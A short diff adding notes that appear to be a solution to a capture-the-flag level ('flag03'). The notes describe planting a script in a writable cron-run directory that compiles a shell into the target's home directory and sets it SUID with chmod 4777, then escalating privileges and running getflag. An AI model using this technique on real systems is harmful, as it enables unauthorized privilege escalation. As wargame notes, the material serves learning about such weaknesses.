@@ -1,0 +1,7 @@
+> add shell script in writable.d:
+  gcc /tmp/shell.c -o /home/flag03/shell
+  chmod 4777 /home/flag03/shell #set SUID bit
+
+> privilege escalation
+
+> getflag
